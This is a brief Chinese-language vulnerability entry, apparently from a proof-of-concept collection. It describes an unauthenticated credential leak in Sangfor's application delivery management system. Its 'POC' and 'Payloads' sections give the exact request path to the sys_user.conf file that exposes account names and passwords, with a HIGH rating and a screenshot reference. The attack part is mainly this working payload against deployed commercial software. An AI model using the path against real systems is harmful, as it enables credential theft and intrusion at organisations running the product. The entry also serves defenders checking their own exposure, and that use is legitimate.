# 深信服 应用交付管理系统 sys_user.conf 账号密码泄漏漏洞

## 漏洞描述
深信服 应用交付管理系统 文件sys_user.conf可在未授权的情况下直接访问，导致账号密码泄漏

## 危害等级
HIGH

## 参考链接

## 漏洞复现方法
登录页面

![image-20220525145113865](images/202205251451936.png)

验证POC

```
/tmp/updateme/sinfor/ad/sys/sys_user.conf
```


## Payloads
```
/tmp/updateme/sinfor/ad/sys/sys_user.conf
```
